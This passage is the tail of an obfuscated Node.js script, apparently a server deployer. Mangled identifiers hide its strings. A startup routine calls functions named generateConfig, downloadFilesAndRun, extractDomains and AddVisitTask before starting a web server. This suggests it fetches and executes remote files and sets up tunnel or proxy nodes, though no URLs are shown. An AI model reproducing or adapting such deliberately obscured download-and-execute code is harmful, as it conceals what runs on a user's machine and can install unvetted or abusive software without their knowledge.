console[_0xc8560b(0x1ec)](_0xc8560b(0x208)+_0x42033d['message']),null;}}async function startserver(){const _0x3f64ee=_0x5420ec;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x405ae9){console[_0x3f64ee(0x1ec)](_0x3f64ee(0x1f1),_0x405ae9);}}startserver()[_0x5420ec(0x1d0)](_0x2d9827=>{const _0x47bb62=_0x5420ec;console[_0x47bb62(0x1ec)](_0x47bb62(0x1d3),_0x2d9827);}),app[_0x5420ec(0x1dd)](PORT,()=>console['log'](_0x5420ec(0x26b)+PORT+'!'));
